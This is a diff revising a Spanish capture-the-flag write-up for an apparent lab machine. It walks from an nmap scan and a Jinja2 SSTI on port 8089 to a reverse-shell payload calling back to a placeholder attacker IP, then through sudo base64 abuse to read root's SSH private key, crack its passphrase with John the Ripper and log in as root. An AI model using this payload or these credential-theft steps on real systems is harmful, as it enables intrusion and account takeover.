@@ -1,6 +1,6 @@
 ## 1. Reconocimiento Inicial con Nmap
 
-Realizamos un escaneo exhaustivo con `nmap` para detectar puertos abiertos, sus versiones y el sistema operativo. Esto nos proporciona una visión general de los servicios expuestos y posibles vulnerabilidades asociadas a sus versiones.
+Iniciamos la auditoría realizando un escaneo exhaustivo para detectar puertos abiertos, servicios y sus respectivas versiones.
 
 ```bash
 nmap -O -sC -sV <IP_DEL_OBJETIVO>
@@ -8,8 +8,8 @@ nmap -O -sC -sV <IP_DEL_OBJETIVO>
 
 **Resultados Clave:**
 
-*   `22/tcp open ssh OpenSSH 9.2p1 Debian`: El puerto 22 (estándar para SSH) está abierto, lo que indica que podemos intentar acceder al sistema por esta vía si encontramos credenciales.
-*   `80/tcp open http Apache httpd 2.4.59`: El puerto 80 está abierto y ejecuta un servidor web Apache. **La página por defecto de Apache no revela información útil inicialmente.**
+*   `22/tcp open ssh OpenSSH 9.2p1 Debian`
+*   `80/tcp open http Apache httpd 2.4.59`: La página por defecto de Apache no revela información útil inicialmente.
 *   `8089/tcp open http Werkzeug httpd 2.2.2 (Python 3.11.2)`: El puerto 8089 está abierto y ejecuta un servidor web `Werkzeug` con Python. Este es un punto de interés, ya que las aplicaciones web personalizadas a menudo contienen vulnerabilidades.
 
 ## 2. Enumeración Web y Descubrimiento de SSTI
@@ -18,13 +18,14 @@ Nos centramos en el puerto 8089, ya que es el servicio más prometedor para enco
 
 ### 2.1. Exploración del Puerto 8089
 
-Al acceder a `http://<IP_DEL_OBJETIVO>:8089/`, encontramos una página web simple con un campo de entrada. Al introducir texto como "Hola", la página responde con "Hola Hola". Este comportamiento, donde la entrada del usuario se repite directamente en la salida, es un fuerte indicador de una posible vulnerabilidad de Server-Side Template Injection (SSTI).
+Al acceder a `http://<IP_DEL_OBJETIVO>:8089/`, encontramos una página web simple con un campo de entrada. Al introducir texto como "Hola", la página responde con "Hola Hola". 
+Este comportamiento, donde la entrada del usuario se repite directamente en la salida, es un fuerte indicador de una posible vulnerabilidad de Server-Side Template Injection (SSTI).
 ![[Verdejo_P_8089.png]]
-### 2.2. Confirmación de SSTI con Jinja2
+### 2.2. Confirmación de SSTI (Jinja2)
 
 Para confirmar la vulnerabilidad SSTI y determinar el motor de plantillas, probamos una expresión matemática simple dentro de la sintaxis de plantillas de Jinja2, que es común en aplicaciones Python como las que usan Werkzeug.
 
-Introducimos `{{7*7}}` en el campo de entrada. Si la página devuelve `49`, esto confirma la vulnerabilidad SSTI y que el motor de plantillas es Jinja2. Esto significa que la aplicación web procesa la entrada del usuario a través de un motor de plantillas en el servidor sin una validación adecuada, permitiendo la inyección de código de plantilla malicioso.
+Introducimos `{{7*7}}` en el campo de entrada. Si la página devuelve `49`, esto confirma la vulnerabilidad SSTI y que el motor de plantillas es Jinja2. Lo que significa que la aplicación web procesa la entrada del usuario a través de un motor de plantillas en el servidor sin una validación adecuada, permitiendo la inyección de código de plantilla malicioso.
 ![[Verdejo_49.png]]
 ## 3. Obtención de Reverse Shell (RCE)
 
@@ -50,11 +51,6 @@ Ahora que podemos ejecutar comandos, inyectamos un payload de reverse shell para
 {{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'bash -c \\\'bash -i >& /dev/tcp/<IP_DE_TU_KALI>/443 0>&1\\\'\').read() }}
 ```
 
-*   `os.popen()`: Ejecuta un comando en una subshell.
-*   `bash -c '...'`: Ejecuta un comando bash.
-*   `bash -i`: Inicia una shell interactiva.
-*   `>& /dev/tcp/<IP_DE_TU_KALI>/443 0>&1`: Redirige la entrada y salida estándar a una conexión TCP a la IP de nuestra máquina atacante en el puerto 443.
-
 **En la Máquina Atacante:**
 
 Antes de introducir el payload, configuramos un `netcat` listener en nuestra máquina atacante para recibir la conexión entrante en el puerto 443.
@@ -77,87 +73,66 @@ Verificamos qué comandos puede ejecutar el usuario actual con `sudo` sin necesi
 sudo -l
 ```
 
-**Resultados Clave:**
+**Salida:** `(root) NOPASSWD: /usr/bin/base64`
 
-*   `(root) NOPASSWD: /usr/bin/base64`
+El usuario puede ejecutar el binario `base64` como `root` sin necesidad de contraseña. `base64` es una herramienta de codificación/decodificación que, al ejecutarse con altos privilegios, nos permite leer cualquier archivo del sistema.
 
-Esto significa que el usuario actual puede ejecutar el binario `/usr/bin/base64` como `root` sin necesidad de introducir su contraseña. El comando `base64` se utiliza para codificar y decodificar datos, y puede ser abusado para leer o escribir archivos con privilegios elevados.
+### 4.2. Intento de Manipulación de /etc/passwd (Rabbit Hole)
 
-### 4.2. Abuso de `base64` para Modificar `/etc/passwd`
+En un primer intento, tratamos de extraer el archivo `/etc/passwd`, modificarlo eliminando la contraseña de `root` y volver a sobrescribirlo usando el parámetro `--decode`.
 
-La técnica para escalar privilegios con `base64` cuando tiene permisos `NOPASSWD` en `sudo` implica modificar el archivo `/etc/passwd` para eliminar la contraseña del usuario `root`. Esto nos permitirá iniciar sesión como `root` sin contraseña.
+Sin embargo, la ejecución del comando: `sudo -u root /usr/bin/base64 --decode passwd.txt > /etc/passwd` falla debido a restricciones de permisos (Permiso denegado). 
 
-1.  **Leer `/etc/passwd`:** Primero, leemos el contenido de `/etc/passwd` utilizando `base64` con `sudo` y lo decodificamos.
+> [!nota] Esto ocurre porque el operador de redirección `>` es interpretado por la shell de nuestro usuario actual (`www-data`), no por `sudo`.
 
-    ```bash
-    LFILE=/etc/passwd
-    sudo base64 "$LFILE" | base64 --decode
-    ```
+### 4.3. Exfiltración de Clave SSH (id_rsa)
 
-    Esto nos mostrará el contenido del archivo, incluyendo la línea de `root`:
-    `root:x:0:0:root:/root:/bin/bash`
+En lugar de escribir en archivos del sistema, utilizaremos el binario para **leer** archivos confidenciales inaccesibles para nuestro usuario.
 
-2.  **Modificar el contenido:** Copiamos el contenido de `/etc/passwd` a un archivo temporal en nuestra máquina atacante (o en el sistema comprometido si tenemos permisos de escritura en algún directorio). Luego, eliminamos la `x` de la entrada de `root`. La línea debe cambiar a `root::0:0:root:/root:/bin/bash`.
+Procedemos a extraer la clave privada SSH del usuario `root`:
 
-3.  **Codificar el contenido modificado:** Codificamos el archivo modificado de nuevo a Base64 y lo guardamos en un archivo.
-
-4.  **Sobrescribir `/etc/passwd` con `base64`:** Utilizamos `base64` con `sudo` para decodificar el contenido modificado y redirigir la salida al archivo `/etc/passwd`.
-```bash
-sudo -u root /usr/bin/base64 --decode passwd.txt > /etc/passwd
+```Bash
+sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 --decode
 ```
 
-Como no podemos modificar este archivo vamos a buscar la clave de ssh
+Copiamos el contenido devuelto y lo guardamos en nuestra máquina local en un archivo llamado `id_rsa_root`. Le asignamos los permisos restrictivos requeridos por el protocolo SSH:
 
-### 4.3. Escalada de Privilegios Alternativa (Clave SSH)
+```Bash
+chmod 600 id_rsa_root
+```
 
-Si la modificación de `/etc/passwd` no es posible o preferible, otra vía para escalar privilegios es buscar claves SSH privadas del usuario `root`.
+Al intentar conectarnos (`ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>`), descubrimos que la clave está protegida por una contraseña (_passphrase_).
 
-1.  **Leer la clave SSH privada de `root`:** Utilizamos `base64` con `sudo` para leer el archivo `id_rsa` de `root` y lo decodificamos.
+### 4.4. Cracking de la Passphrase SSH
 
-    ```bash
-    sudo -u root base64 /root/.ssh/id_rsa | base64 --decode
-    ```
+Procedemos a romper la seguridad de la clave localmente utilizando la suite de **John the Ripper**.
 
-    Esto nos devolverá el contenido de la clave SSH privada de `root`.
+1. Extraemos el hash de la clave:
 
-2.  **Guardar la clave:** Copiamos el contenido de la clave SSH a un archivo local en nuestra máquina atacante (por ejemplo, `id_rsa_root`).
+```Bash
+ssh2john id_rsa_root > key.hash
+```
 
-3.  **Establecer permisos:** Las claves SSH privadas requieren permisos estrictos para ser utilizadas.
+2. Ejecutamos un ataque de fuerza bruta mediante diccionario:
 
-    ```bash
-    chmod 600 id_rsa_root
-    ```
+```Bash
+john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
-4.  **Intentar conexión SSH como `root`:** Intentamos conectarnos vía SSH como `root` utilizando la clave privada.
+La herramienta logra descifrar la frase de contraseña: **`honda1`**.
 
-    ```bash
-    ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>
-    ```
+## 5. Obtención de Root
 
-    La clave está protegida con una frase de contraseña.
+Con la clave privada y su correspondiente _passphrase_, nos conectamos al servidor a través del puerto 22.
 
-### 4.4. Cracking de la Frase de Contraseña
+```Bash
+ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>
+# Enter passphrase for key 'id_rsa_root': honda1
+```
 
-Si la clave SSH está protegida con una frase de contraseña, podemos intentar crackearla utilizando `ssh2john` y `john` (John the Ripper).
+Confirmamos el compromiso total de la máquina:
 
-1.  **Convertir la clave a formato John:**
-
-    ```bash
-    ssh2john id_rsa_root > key.hash
-    ```
-
-2.  **Crackear la frase de contraseña:**
-
-    ```bash
-    john key.hash --wordlist=/path/to/wordlist/rockyou.txt
-    ```
-
-    Una vez crackeada, `john --show key.hash` nos mostrará la frase de contraseña (por ejemplo, `honda1`).
-
-3.  **Conexión SSH con la frase de contraseña:** Volvemos a intentar la conexión SSH con la clave y la frase de contraseña obtenida.
-
-    ```bash
-    ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>
-    ```
-
-    Una vez dentro, `whoami` confirmará el acceso como `root`.
+```Bash
+whoami
+# root
+```
